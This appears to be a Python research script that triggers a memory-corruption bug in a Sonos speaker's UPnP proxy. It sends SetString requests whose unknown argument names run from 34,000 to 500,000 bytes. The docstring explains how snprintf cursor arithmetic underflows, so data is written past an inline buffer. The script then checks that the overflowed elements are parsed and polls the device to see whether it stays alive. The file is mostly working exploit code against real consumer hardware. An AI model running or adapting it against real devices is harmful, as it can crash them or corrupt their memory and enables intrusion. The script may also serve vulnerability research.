#!/usr/bin/env python3
"""jc7 — the only reachable way past the 34148-byte inline-buffer wall: an argument NAME.

Every *known* SCDP argument is device-capped below the wall (SystemProperties key/value 2047 B,
AVTransport metadata 4095 B, favorites metadata -> 803 at 4410 B), so a real argument can never
be 34148 B long. An argument name the device does not know is still marshalled by the proxy
(0x509d4c writes name/value with a literal "<%s>%s</%s>" and advances the cursor by snprintf's
full return), so a long unknown name is the reachable trigger.

Per case: one SetString carrying [unknown 40000+ name][VariableName=K][StringValue=v].
- the unknown element is the first element, so it is the one snprintf cuts at `end-cursor+1`;
- the cursor then lands past `end`, `end-cursor` underflows unsigned, the grow branch is skipped
  and the two later elements are written past the inline buffer;
- the device tolerates the cut element and still binds the trailing pair, which is the proof the
  bytes past the buffer were written and parsed.
"""
import json, os, subprocess, sys, threading, time

IP = os.environ.get("IP", "192.168.4.86")
U = os.environ.get("U", "RINCON_7828CA9221DC01400")
OUT = os.environ.get("OUT", "recon/jc7/wall_names.tsv")
SPACING = float(os.environ.get("SPACING", "2"))
API = f"https://{IP}:1443/api/v1/players/{U}/upnpSystemProperties"

def post(body):
    open("/tmp/jc7_wn.json", "w").write(json.dumps(body))
    r = subprocess.run(["curl", "-sk", "-m", "60", "--http1.1", "-X", "POST",
                        "-H", "X-Sonos-Api-Key: x", "-H", "Content-Type: application/json",
                        "--data-binary", "@/tmp/jc7_wn.json", "-w", "\n%{http_code}", API],
                       capture_output=True, text=True)
    o = r.stdout.rsplit("\n", 1)
    try: j = json.loads(o[0])
    except Exception: j = {}
    return j, o[-1]

stop = threading.Event()
def poll():
    with open(OUT + ".poll", "w") as f:
        while not stop.is_set():
            r = subprocess.run(["curl", "-s", "-m", "2", "-o", "/dev/null", "-w", "%{http_code}",
                                f"http://{IP}:1400/status/VERSION"], capture_output=True, text=True)
            f.write(f"{time.strftime('%H:%M:%S')} {r.stdout}\n"); f.flush(); time.sleep(0.1)

log = open(OUT, "w"); log.write("ts\tcase\tname_bytes\tbody_bytes\tset_http\tset_rc\tget_rc\tbound\n")
threading.Thread(target=poll, daemon=True).start()
for n in (34000, 34130, 34160, 70000, 200000, 500000):
    key = f"jc7W{n}"
    name = "Z" * n
    j, code = post({"method": "SetString", "input": [
        {"name": name, "value": "x"},
        {"name": "VariableName", "value": key},
        {"name": "StringValue", "value": "v"}]})
    time.sleep(0.7)
    g, _ = post({"method": "GetString", "input": [{"name": "VariableName", "value": key}]})
    bound = "yes" if (g.get("result") == 0 and (g.get("parameters") or [{}])[0].get("value") == "v") else "no"
    log.write(f"{time.strftime('%H:%M:%S')}\tname{n}\t{n}\t{n*2+120}\t{code}\t{j.get('result')}\t"
              f"{g.get('result')}\t{bound}\n"); log.flush()
    print(f"name{n:<7} http={code} set_rc={j.get('result')} trailing-pair-bound={bound}", flush=True)
    time.sleep(SPACING)
alive = subprocess.run(["curl", "-s", "-m", "4", "-o", "/dev/null", "-w", "%{http_code}",
                        f"http://{IP}:1400/status/VERSION"], capture_output=True, text=True).stdout
log.write(f"{time.strftime('%H:%M:%S')}\tBATCH_END\t-\t-\t{alive}\t-\t-\t-\n"); log.close(); stop.set()
print("BATCH_END", alive)
